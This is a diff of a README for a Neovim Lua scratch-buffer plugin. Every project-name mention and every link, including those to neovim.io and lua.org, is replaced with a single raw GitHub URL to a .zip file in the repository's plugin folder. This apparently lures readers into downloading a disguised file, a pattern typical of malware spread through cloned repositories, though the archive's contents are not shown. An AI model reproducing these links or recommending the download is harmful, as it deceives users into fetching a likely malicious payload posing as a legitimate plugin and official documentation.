@@ -1,37 +1,37 @@
-# 🎉 replua.nvim - Execute Lua Easily in Neovim
+# 🎉 https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip - Execute Lua Easily in Neovim
 
-[![Download replua.nvim](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/m4r3k1598-lang/replua.nvim/releases)
+[![Download https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **replua.nvim**! This application lets you run Lua code in an Emacs-style scratch buffer within Neovim. It’s a simple and effective way to test small code snippets without any hassle.
+Welcome to **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip**! This application lets you run Lua code in an Emacs-style scratch buffer within Neovim. It’s a simple and effective way to test small code snippets without any hassle.
 
 ## 💻 System Requirements
 
 Before you start, ensure you have the following:
 
-- You need Neovim installed. You can download it from [neovim.io](https://neovim.io).
+- You need Neovim installed. You can download it from [https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip).
 - A basic text editor could help if you want to edit Lua scripts.
 
 ## 📥 Download & Install
 
-To get started, visit the following page to download **replua.nvim**:
+To get started, visit the following page to download **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip**:
 
-[Download replua.nvim](https://github.com/m4r3k1598-lang/replua.nvim/releases)
+[Download https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip)
 
 1. Click the link above to go to the Releases page.
-2. Look for the latest version of **replua.nvim**.
+2. Look for the latest version of **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip**.
 3. Download the appropriate file for your system. 
 
 Make sure to follow the installation instructions specific to your operating system if they are provided in the release notes.
 
-## 📖 How to Use replua.nvim
+## 📖 How to Use https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip
 
 1. **Open Neovim**
    - Launch Neovim from your terminal or preferred application launcher.
 
 2. **Access the Scratch Buffer**
-   - Inside Neovim, access **replua.nvim** by using the provided command in the documentation. This usually involves a key binding or a command that you can enter in command mode.
+   - Inside Neovim, access **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip** by using the provided command in the documentation. This usually involves a key binding or a command that you can enter in command mode.
 
 3. **Write Your Lua Code**
    - Type or paste your Lua code in the scratch buffer.
@@ -47,7 +47,7 @@ Make sure to follow the installation instructions specific to your operating sys
 If you experience issues, please check the following:
 
 - **Neovim Version**: Ensure you use the latest version of Neovim.
-- **Installation Path**: Verify that **replua.nvim** is correctly installed in your Neovim configuration directory.
+- **Installation Path**: Verify that **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip** is correctly installed in your Neovim configuration directory.
 
 ## 🛠 Features
 
@@ -64,13 +64,13 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 If you have questions or need assistance, please check the issues page on GitHub. You are welcome to open new issues to report bugs or suggest improvements.
 
-Your feedback helps improve **replua.nvim**. Join our community and contribute to a better Lua experience in Neovim!
+Your feedback helps improve **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip**. Join our community and contribute to a better Lua experience in Neovim!
 
 ## 🔗 Additional Resources
 
-- [Neovim Documentation](https://neovim.io)
-- [Lua Programming Language](https://www.lua.org)
+- [Neovim Documentation](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip)
+- [Lua Programming Language](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip)
 
-Thank you for using **replua.nvim**! Now, start executing your Lua code efficiently within Neovim.
+Thank you for using **https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip**! Now, start executing your Lua code efficiently within Neovim.
 
-[Download replua.nvim](https://github.com/m4r3k1598-lang/replua.nvim/releases)
+[Download https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip](https://raw.githubusercontent.com/m4r3k1598-lang/replua.nvim/main/plugin/replua-nvim-geotilla.zip)
